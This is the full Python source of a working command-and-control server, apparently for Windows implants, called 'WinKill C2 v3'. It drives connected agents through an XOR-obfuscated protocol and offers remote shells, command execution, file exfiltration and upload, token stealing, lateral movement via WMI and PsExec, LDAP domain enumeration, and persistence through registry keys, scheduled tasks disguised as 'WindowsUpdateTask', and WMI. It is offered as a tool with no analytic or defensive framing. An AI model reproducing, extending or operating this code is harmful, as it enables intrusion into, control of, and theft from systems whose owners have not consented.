#!/usr/bin/env python3
r"""
WinKill C2 Server v3 - Multi-Agent with Lateral Movement
=========================================================
Multiplexed TCP C2 controller supporting multiple agents,
lateral movement, domain enumeration, and persistence.

Usage: python c2_server.py [HOST] [PORT]

Commands:
  agents             - List connected agents
  use <id>           - Switch to agent
  shell [id|new]     - List/create/interact with shells
  ps                 - List target processes
  kill <PID>         - Kill a process on target
  exec <cmd>         - Execute command (direct, no cmd.exe wrapper)
  download <path>    - Download file from target (chunked, any size)
  upload <src> <dst> - Upload file to target (chunked, any size)
  status             - Show agent status

  # Lateral Movement
  jump wmi <target> <cmd> [user] [pass]
  jump psexec <target> <binary> [svcname]
  jump smb_start <pipename>
  jump smb_stop
  steal <PID>        - Steal token from process
  steal <DOMAIN\User> - Find & steal token by username

  # Domain Enumeration
  domain discover     - Discover domain/DC info
  domain ldap <baseDN> [filter]

  # Persistence
  persist registry <path>
  persist schtask <path> [taskname]
  persist wmi <path>

  # Agent Config
  config sleep=<ms> jitter=<pct> shell=<host>
  shutdown            - Graceful shutdown
"""

import socket
import struct
import sys
import time
import threading
import os
import select

HOST = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444

# Protocol constants
CHAN_CTRL      = 0x00000000
CHAN_SHELL     = 0x10000000

MSG_HEARTBEAT   = 0x00
MSG_STATUS      = 0x01
MSG_SHUTDOWN    = 0x02
MSG_SHELL_SPAWN = 0x10
MSG_SHELL_DATA  = 0x11
MSG_SHELL_KILL  = 0x12
MSG_PROC_LIST   = 0x20
MSG_PROC_KILL   = 0x21
MSG_FILE_GET    = 0x30
MSG_FILE_PUT    = 0x31
MSG_FILE_DATA   = 0x32
MSG_FILE_ACK    = 0x33
MSG_FILE_CHUNK  = 0x34
MSG_EXEC        = 0x40
MSG_EXEC_OUT    = 0x41
MSG_LATERAL     = 0x50
MSG_LATERAL_OUT = 0x51
MSG_DOMAIN      = 0x60
MSG_DOMAIN_OUT  = 0x61
MSG_PERSIST     = 0x70
MSG_PERSIST_OUT = 0x71
MSG_TOKEN       = 0x80
MSG_TOKEN_OUT   = 0x81
MSG_SMB_LINK    = 0x90
MSG_CONFIG      = 0xA0
MSG_CONFIG_OUT  = 0xA1

KEY = bytes([0x4A, 0x7F, 0x23, 0x9C, 0x11, 0x8E, 0x55, 0x3D,
             0x6B, 0x12, 0x89, 0xFA, 0x34, 0xD7, 0x01, 0xCB])

def xor(data):
    return bytes(b ^ KEY[i % 16] for i, b in enumerate(data))


class ShellSession:
    def __init__(self, sid, channel):
        self.id = sid
        self.channel = channel
        self.alive = True
        self.output_buffer = b""


class AgentSession:
    """Represents one connected agent."""
    _next_id = 0

    def __init__(self, sock, addr):
        AgentSession._next_id += 1
        self.agent_id = AgentSession._next_id
        self.sock = sock
        self.addr = addr
        self.hostname = "unknown"
        self.username = "unknown"
        self.os_info = "unknown"
        self.sessions = {}     # shell_id -> ShellSession
        self.next_sid = 2
        self.active_shell = None
        self.lock = threading.Lock()
        self.alive = True
        self.reader_thread = None
        self.heartbeat_thread = None

        # Auto-spawn shell #1
        self.sessions[1] = ShellSession(1, CHAN_SHELL | 1)

    def send_frame(self, channel, msg_type, payload=b""):
        if not self.alive:
            return False
        try:
            total = len(payload) + 5
            frame = struct.pack('<IIB', total, channel, msg_type) + payload
            frame = frame[:4] + xor(frame[4:])
            self.sock.sendall(frame)
            return True
        except:
            self.alive = False
            return False

    def recv_frame(self):
        try:
            hdr = self.sock.recv(4)
            if len(hdr) < 4:
                return None
            total = struct.unpack('<I', hdr)[0]
            if total > 0x800000 or total < 5:
                return None
            buf = b""
            while len(buf) < total:
                chunk = self.sock.recv(total - len(buf))
                if not chunk:
                    return None
                buf += chunk
            buf = xor(buf)
            ch = struct.unpack('<I', buf[:4])[0]
            mt = buf[4]
            pl = buf[5:]
            return (ch, mt, pl)
        except:
            return None

    def reader_loop(self):
        """Background thread: receive frames from this agent."""
        while self.alive:
            f = self.recv_frame()
            if f is None:
                break
            ch, mt, pl = f

            if ch == CHAN_CTRL:
                if mt == MSG_STATUS:
                    text = pl.decode(errors='replace').strip()
                    # Parse host info on first status
                    if text.startswith("HOST="):
                        for part in text.split():
                            if part.startswith("HOST="):
                                self.hostname = part[5:]
                            elif part.startswith("USER="):
                                self.username = part[5:]
                            elif part.startswith("OS="):
                                self.os_info = part[3:]
                            elif part.startswith("PID="):
                                pass
                    print(f"\n[Agent{self.agent_id}] {text}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_PROC_LIST:
                    print(f"\n{pl.decode(errors='replace')}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_PROC_KILL:
                    print(f"\n{pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_EXEC_OUT:
                    try:
                        text = pl.decode('gbk', errors='replace')
                        sys.stdout.write(text)
                    except:
                        sys.stdout.buffer.write(pl)
                    sys.stdout.flush()

                elif mt == MSG_FILE_DATA:
                    # Chunked download header: totalSize(4) + pathLen(2) + path
                    if len(pl) > 6:
                        total_size = struct.unpack('<I', pl[:4])[0]
                        path_len = struct.unpack('<H', pl[4:6])[0]
                        path = pl[6:6+path_len].decode(errors='replace')
                        safe_path = path.replace('\\', '_').replace('/', '_')
                        os.makedirs('downloads', exist_ok=True)
                        full_path = os.path.join('downloads', safe_path)
                        self._dl_file = open(full_path, 'wb')
                        self._dl_path = full_path
                        self._dl_name = path
                        self._dl_size = total_size
                        self._dl_got = 0
                        print(f"\n[Download] {path} ({total_size} bytes) -> {full_path}")
                        sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_FILE_CHUNK:
                    if hasattr(self, '_dl_file') and self._dl_file:
                        if len(pl) >= 4:
                            offset = struct.unpack('<I', pl[:4])[0]
                            if offset == 0xFFFFFFFF:
                                # End marker
                                self._dl_file.close()
                                print(f"\n[Download] Complete: {self._dl_path} ({self._dl_got} bytes)")
                                sys.stdout.write("C2> "); sys.stdout.flush()
                                self._dl_file = None
                            else:
                                data = pl[4:]
                                self._dl_file.write(data)
                                self._dl_got += len(data)

                elif mt == MSG_LATERAL_OUT:
                    print(f"\n{pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_DOMAIN_OUT:
                    print(f"\n{pl.decode(errors='replace')}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_PERSIST_OUT:
                    print(f"\n{pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_TOKEN_OUT:
                    print(f"\n{pl.decode(errors='replace')}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

                elif mt == MSG_SMB_LINK:
                    # Data from linked agent via SMB relay
                    try:
                        sys.stdout.write(f"[SMB-LINK] {pl.decode(errors='replace')}")
                    except:
                        pass
                    sys.stdout.flush()

                elif mt == MSG_CONFIG_OUT:
                    print(f"\n[Config] {pl.decode(errors='replace').strip()}")
                    sys.stdout.write("C2> "); sys.stdout.flush()

            elif (ch & 0xF0000000) == CHAN_SHELL:
                sid = ch & 0x0FFFFFFF
                if mt == MSG_SHELL_DATA:
                    with self.lock:
                        if self.active_shell == sid:
                            try:
                                text = pl.decode('gbk', errors='replace')
                                sys.stdout.write(text)
                            except:
                                sys.stdout.buffer.write(pl)
                            sys.stdout.flush()
                        elif sid in self.sessions:
                            self.sessions[sid].output_buffer += pl

        # Reader exited - agent disconnected
        self.alive = False
        print(f"\n[!] Agent{self.agent_id} disconnected ({self.addr[0]})")
        sys.stdout.write("C2> "); sys.stdout.flush()

    def start_reader(self):
        self.reader_thread = threading.Thread(target=self.reader_loop, daemon=True)
        self.reader_thread.start()

    def start_heartbeat(self):
        def hb():
            while self.alive:
                time.sleep(30)
                if not self.send_frame(CHAN_CTRL, MSG_HEARTBEAT):
                    break
        self.heartbeat_thread = threading.Thread(target=hb, daemon=True)
        self.heartbeat_thread.start()

    def close(self):
        self.alive = False
        try:
            self.sock.close()
        except:
            pass


class C2Server:
    def __init__(self):
        self.agents = {}       # agent_id -> AgentSession
        self.current_agent = None
        self.running = True
        self.listener = None
        self.accept_thread = None

    def _fmt_agent(self, a):
        """Format agent for display."""
        marker = " *" if a is self.current_agent else "  "
        return (f"{marker} Agent{a.agent_id} | {a.hostname} | {a.username} | "
                f"{a.addr[0]}:{a.addr[1]} | Shells: {len(a.sessions)} | "
                f"{'ALIVE' if a.alive else 'DEAD'}")

    def accept_loop(self):
        """Accept incoming agent connections."""
        while self.running:
            try:
                client, addr = self.listener.accept()
                agent = AgentSession(client, addr)
                self.agents[agent.agent_id] = agent
                agent.start_reader()
                agent.start_heartbeat()

                # Send auto-spawn shell #1
                agent.send_frame(CHAN_CTRL, MSG_SHELL_SPAWN,
                                 struct.pack('<I', CHAN_SHELL | 1))

                # Auto-select if first agent
                if self.current_agent is None:
                    self.current_agent = agent

                print(f"\n[+] Agent{agent.agent_id}: {addr[0]}:{addr[1]}")
                print(f"[*] Shell #1 auto-spawned. Use 'shell 1' to interact.")
                sys.stdout.write("C2> "); sys.stdout.flush()
            except:
                if self.running:
                    time.sleep(0.5)
                else:
                    break

    # ---- Command Handlers ----

    def cmd_agents(self, args):
        """List all connected agents."""
        if not self.agents:
            print("No agents connected.")
            return
        for a in self.agents.values():
            print(self._fmt_agent(a))

    def cmd_use(self, args):
        """Switch to a different agent."""
        if not args:
            if self.current_agent:
                print(f"Current: Agent{self.current_agent.agent_id}")
            else:
                print("No agent selected.")
            return

        try:
            aid = int(args[0])
        except ValueError:
            print(f"Invalid agent ID: {args[0]}")
            return

        if aid not in self.agents:
            print(f"Agent{aid} not found.")
            return

        if not self.agents[aid].alive:
            print(f"Agent{aid} is dead.")
            return

        self.current_agent = self.agents[aid]
        print(f"[*] Switched to Agent{aid}")

    def cmd_shell(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Active shells:")
            for s in a.sessions.values():
                print(f"  Shell #{s.id} (ch={s.channel:08X})")
            print("Use 'shell new' to spawn, 'shell <id>' to interact")
            return

        if args[0] == "new":
            sid = a.next_sid
            a.next_sid += 1
            ch = CHAN_SHELL | sid
            a.send_frame(CHAN_CTRL, MSG_SHELL_SPAWN, struct.pack('<I', ch))
            a.sessions[sid] = ShellSession(sid, ch)
            print(f"[+] Shell #{sid} spawned (ch={ch:08X})")

        elif args[0] == "list":
            self.cmd_shell([])

        else:
            try:
                sid = int(args[0])
            except ValueError:
                print(f"Unknown: {args[0]}")
                return

            if sid not in a.sessions:
                print(f"Shell #{sid} not found. Use 'shell new' first.")
                return

            with a.lock:
                a.active_shell = sid

            # Flush buffered output
            if sid in a.sessions:
                s = a.sessions[sid]
                if s.output_buffer:
                    try:
                        text = s.output_buffer.decode('gbk', errors='replace')
                        sys.stdout.write(text)
                    except:
                        sys.stdout.buffer.write(s.output_buffer)
                    sys.stdout.flush()
                    s.output_buffer = b""

            print(f"\n[*] Shell #{sid} on Agent{a.agent_id} (Ctrl+C to exit)")
            try:
                while True:
                    try:
                        line = input()
                    except:
                        break
                    if not line and a.active_shell != sid:
                        break
                    if line:
                        a.send_frame(a.sessions[sid].channel,
                                     MSG_SHELL_DATA, (line + '\r\n').encode())
            except (EOFError, KeyboardInterrupt, BrokenPipeError):
                pass
            finally:
                with a.lock:
                    a.active_shell = None
                print(f"\n[*] Left Shell #{sid}")

    def cmd_ps(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        a.send_frame(CHAN_CTRL, MSG_PROC_LIST)
        time.sleep(1.5)

    def cmd_kill(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        if args:
            a.send_frame(CHAN_CTRL, MSG_PROC_KILL, args[0].encode())

    def cmd_exec(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        if args:
            cmd = " ".join(args)
            a.send_frame(CHAN_CTRL, MSG_EXEC, cmd.encode())
            print(f"[*] Executing: {cmd}")
            # Don't wait - output arrives async via MSG_EXEC_OUT

    def cmd_download(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        if args:
            a.send_frame(CHAN_CTRL, MSG_FILE_GET, args[0].encode())
            print(f"[*] Downloading: {args[0]}")

    def cmd_upload(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        if len(args) < 2:
            print("Usage: upload <local_path> <remote_path>")
            return

        src, dst = args[0], args[1]
        try:
            with open(src, 'rb') as f:
                data = f.read()
        except Exception as e:
            print(f"[-] Cannot read {src}: {e}")
            return

        dst_bytes = dst.encode()
        total_size = len(data)

        # Send header: totalSize(4) + pathLen(2) + path
        hdr = struct.pack('<IH', total_size, len(dst_bytes)) + dst_bytes
        a.send_frame(CHAN_CTRL, MSG_FILE_DATA, hdr)

        # Send file in 65535-byte chunks
        CHUNK = 65535
        offset = 0
        while offset < total_size:
            chunk = data[offset:offset + CHUNK]
            frame = struct.pack('<I', offset) + chunk
            a.send_frame(CHAN_CTRL, MSG_FILE_CHUNK, frame)
            offset += len(chunk)

        # Send end marker
        a.send_frame(CHAN_CTRL, MSG_FILE_CHUNK, struct.pack('<I', 0xFFFFFFFF))

        print(f"[+] Uploaded {src} -> {dst} ({total_size} bytes)")

    def cmd_jump(self, args):
        """Lateral movement commands."""
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Usage: jump <method> [args...]")
            print("Methods: wmi, psexec, smb_start, smb_stop")
            return

        method = args[0].lower()
        rest = args[1:]

        if method == "wmi":
            if len(rest) < 2:
                print("Usage: jump wmi <target> <command> [user] [password]")
                return
            payload = f"wmi:{rest[0]}:{' '.join(rest[1:])}"
            a.send_frame(CHAN_CTRL, MSG_LATERAL, payload.encode())

        elif method == "psexec":
            if len(rest) < 2:
                print("Usage: jump psexec <target> <binary_path> [svc_name]")
                return
            svc = rest[2] if len(rest) > 2 else "WinKillSvc"
            payload = f"psexec:{rest[0]}:{rest[1]}:{svc}"
            a.send_frame(CHAN_CTRL, MSG_LATERAL, payload.encode())

        elif method == "smb_start":
            if not rest:
                print("Usage: jump smb_start <pipename>")
                return
            payload = f"smb_start:{rest[0]}"
            a.send_frame(CHAN_CTRL, MSG_LATERAL, payload.encode())

        elif method == "smb_stop":
            a.send_frame(CHAN_CTRL, MSG_LATERAL, b"smb_stop:")

        else:
            print(f"Unknown jump method: {method}")
            print("Available: wmi, psexec, smb_start, smb_stop")

    def cmd_steal(self, args):
        """Token stealing."""
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Usage: steal <PID>  OR  steal <DOMAIN\\User>")
            return

        payload = f"steal:{args[0]}"
        a.send_frame(CHAN_CTRL, MSG_LATERAL, payload.encode())

    def cmd_domain(self, args):
        """Domain enumeration."""
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Usage: domain discover | domain ldap <baseDN> [filter]")
            return

        action = args[0].lower()

        if action == "discover":
            a.send_frame(CHAN_CTRL, MSG_DOMAIN, b"discover")

        elif action == "ldap":
            if len(args) < 2:
                print("Usage: domain ldap <baseDN> [filter]")
                return
            base = args[1]
            filt = args[2] if len(args) > 2 else "(objectClass=*)"
            payload = f"ldap:{base}:{filt}"
            a.send_frame(CHAN_CTRL, MSG_DOMAIN, payload.encode())

        else:
            print(f"Unknown domain command: {action}")
            print("Available: discover, ldap")

    def cmd_persist(self, args):
        """Persistence installation."""
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Usage: persist <method> [args...]")
            print("Methods: registry <path> | schtask <path> [name] | wmi <path>")
            return

        method = args[0].lower()
        rest = args[1:]

        if method == "registry" and rest:
            a.send_frame(CHAN_CTRL, MSG_PERSIST, f"registry:{rest[0]}".encode())

        elif method == "schtask" and rest:
            name = rest[1] if len(rest) > 1 else "WindowsUpdateTask"
            a.send_frame(CHAN_CTRL, MSG_PERSIST, f"schtask:{rest[0]}:{name}".encode())

        elif method == "wmi" and rest:
            a.send_frame(CHAN_CTRL, MSG_PERSIST, f"wmi:{rest[0]}".encode())

        else:
            print(f"Unknown persist method or missing path.")
            print("Available: registry, schtask, wmi")

    def cmd_config(self, args):
        """Runtime agent configuration."""
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return

        if not args:
            print("Usage: config sleep=<ms> jitter=<pct> shell=<cmd.exe|powershell.exe>")
            print("Example: config sleep=5000 jitter=30 shell=powershell.exe")
            return

        config_str = " ".join(args)
        a.send_frame(CHAN_CTRL, MSG_CONFIG, config_str.encode())
        print(f"[*] Sent config: {config_str}")

    def cmd_status(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        print(f"Agent{a.agent_id}: {a.hostname} | {a.username} | {a.os_info}")
        print(f"Address: {a.addr[0]}:{a.addr[1]}")
        print(f"Shells: {list(a.sessions.keys())}")

    def cmd_shutdown(self, args):
        a = self.current_agent
        if not a or not a.alive:
            print("No active agent.")
            return
        a.send_frame(CHAN_CTRL, MSG_SHUTDOWN)
        print("[*] Shutdown sent.")

    def run(self):
        self.listener = socket.socket()
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((HOST, PORT))
        self.listener.listen(16)  # Support multiple agents
        print(f"[*] WinKill C2 v3 - Listening on {HOST}:{PORT}")
        print(f"[*] Waiting for agent connections...")

        # Start accept thread
        self.accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
        self.accept_thread.start()

        # Command loop
        while self.running:
            try:
                raw = input("C2> ").strip()
                if not raw:
                    continue
                parts = raw.split()
                cmd = parts[0].lower()
                args = parts[1:]

                if cmd == "help":
                    print(__doc__)

                elif cmd == "agents":
                    self.cmd_agents(args)

                elif cmd == "use":
                    self.cmd_use(args)

                elif cmd == "shell":
                    self.cmd_shell(args)

                elif cmd == "ps":
                    self.cmd_ps(args)

                elif cmd == "kill":
                    self.cmd_kill(args)

                elif cmd == "exec":
                    self.cmd_exec(args)

                elif cmd == "download":
                    self.cmd_download(args)

                elif cmd == "upload":
                    self.cmd_upload(args)

                elif cmd == "jump":
                    self.cmd_jump(args)

                elif cmd == "steal":
                    self.cmd_steal(args)

                elif cmd == "domain":
                    self.cmd_domain(args)

                elif cmd == "persist":
                    self.cmd_persist(args)

                elif cmd == "config":
                    self.cmd_config(args)

                elif cmd == "status":
                    self.cmd_status(args)

                elif cmd in ("shutdown", "exit", "quit"):
                    if cmd == "shutdown" and self.current_agent:
                        self.cmd_shutdown(args)
                    self.running = False
                    break

                else:
                    print(f"Unknown: {cmd}. Try 'help'")

            except KeyboardInterrupt:
                self.running = False
                break
            except EOFError:
                # stdin closed (headless mode) - just wait
                time.sleep(0.5)

        print("\n[*] Shutting down...")
        self.running = False
        for agent in list(self.agents.values()):
            agent.close()
        try:
            self.listener.close()
        except:
            pass
        print("[*] Done")


if __name__ == "__main__":
    C2Server().run()
